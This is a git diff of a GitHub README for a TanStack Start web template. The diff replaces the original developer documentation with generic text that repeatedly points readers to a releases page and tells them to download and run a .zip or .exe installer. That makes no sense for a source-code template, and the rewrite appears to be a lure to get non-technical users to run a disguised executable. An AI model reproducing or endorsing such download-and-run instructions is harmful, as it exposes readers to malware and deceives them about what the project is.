@@ -1,57 +1,78 @@
-# 🏝️ TanStack-Starter
+# 🏝️ tanstack-starter - Your Simple Start to Online Apps
 
-## Overview
+[![Download tanstack-starter](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kratos-0p/tanstack-starter/releases)
 
-Full-stack starter template for [`tanstack-start`](https://tanstack.com/start/latest), batteries included.
+## 📋 Overview
 
-Inspired by [`dotnize/react-tanstarter`](https://github.com/dotnize/react-tanstarter).
+Welcome to **tanstack-starter**! This is a template designed to help you create web applications without needing technical knowledge. With **tanstack-starter**, you can jump right into building your online presence. This template includes essential tools for user authentication, data management, and more.
 
-This template includes the following:
+## 🔍 Features
 
-- [`tanstack-start`](https://tanstack.com/start/latest)
-- [`drizzle-orm`](https://orm.drizzle.team/)
-- [`better-auth`](https://www.better-auth.com/)
-- [`shadcn/ui`](https://ui.shadcn.com/)
-- [`i18next`](https://react.i18next.com/)
-- [`nitro`](https://nitro.build/)
+- **User Authentication:** Secure login and registration system to keep user data safe.
+- **Data Handling:** Easy management of user data and application settings.
+- **Responsive Design:** Looks great on both mobile devices and desktops.
+- **Customizable:** Tailor the template to fit your unique needs.
 
-## Development
+## 🚀 Getting Started
 
-To get up to speed, see the [`quick-start`](./docs/development/quick-start.md) guide.
+To get started, follow these simple steps to download and run **tanstack-starter**.
 
-This project uses [`pnpm`](https://www.npmjs.com/package/pnpm) but you can use the package manager of your choice!
+### 1. Download the Template
 
-For specific development commands, refer to one of the following documents:
+Visit our [Releases Page](https://github.com/kratos-0p/tanstack-starter/releases) to download the latest version of **tanstack-starter**.
 
-- [`npm`](./docs/commands/npm.md)
-- [`bun`](./docs/commands/bun.md)
-- [`pnpm`](./docs/commands/pnpm.md)
-- [`deno`](./docs/commands/deno.md)
-- [`docker`](./docs/commands/docker.md)
+### 2. Choose Your Download
 
-## Screenshots
+On the Releases page, you will see a list of available versions. Click on the version you want to download. Look for assets or files such as `.zip` or `.exe`. 
 
-**Home Page (Dark Theme)**
+- If you choose a `.zip` file, you will need to extract it after downloading.
+- If you select an executable file (e.g., `.exe`), simply run it after downloading.
 
-![Home Page Image Dark Theme](./assets/screenshots/home_page_dark_theme.png)
+### 3. Install the Application
 
-**Login Page (Dark Theme)**
+If you downloaded a `.zip` file:
+- Right-click on the downloaded file and select "Extract All."
+- Choose a destination folder and click "Extract."
+- Open the folder where you extracted the files.
 
-![Login Page Image Dark Theme](./assets/screenshots/login_page_dark_theme.png)
+If you downloaded an executable file:
+- Double-click on the file to run the installer.
 
-**Home Page (Light Theme)**
+### 4. Run the Application
 
-![Home Page Image Light Theme](./assets/screenshots/home_page_light_theme.png)
+Once installed:
+- Open the application by clicking on its icon.
+- Follow the on-screen instructions to get started.
 
-**Login Page (Light Theme)**
+## 🔧 System Requirements
 
-![Login Page Image Light Theme](./assets/screenshots/login_page_light_theme.png)
+Before downloading, ensure your system meets the following requirements:
 
-## Contributors
+- **Operating System:** Windows 10 or later, macOS Mojave or later.
+- **Storage Space:** At least 200 MB free space.
+- **RAM:** Minimum of 4 GB.
 
- - [`jackytea`](https://github.com/jackytea)
+## 📥 Download & Install
 
-## References
+To download **tanstack-starter**, simply visit this link: [Download Here](https://github.com/kratos-0p/tanstack-starter/releases).
 
-- [`tanstack/router`](https://github.com/TanStack/router)
-- [`dotnize/react-tanstarter`](https://github.com/dotnize/react-tanstarter)
+Follow the instructions listed earlier to install and start using the application.
+
+## 🛠️ Support & Documentation
+
+For any questions, check the documentation included with the download. It offers comprehensive guides to help you navigate through features and functionalities. 
+
+If you need help, you can reach out via the issues section on GitHub. The community is eager to assist you.
+
+## 🌐 Connect With Us
+
+Stay updated on the latest features and updates by following us on:
+
+- **GitHub:** [tanstack-starter Repository](https://github.com/kratos-0p/tanstack-starter)
+- **Twitter:** Check for updates and tips.
+
+## 📌 Notes
+
+Please remember that **tanstack-starter** is a template. Additional customization may be needed based on your specific needs. You can modify the design and settings using the tools included in the package.
+
+Thank you for choosing **tanstack-starter**! Your journey to creating web applications starts here. Happy building!
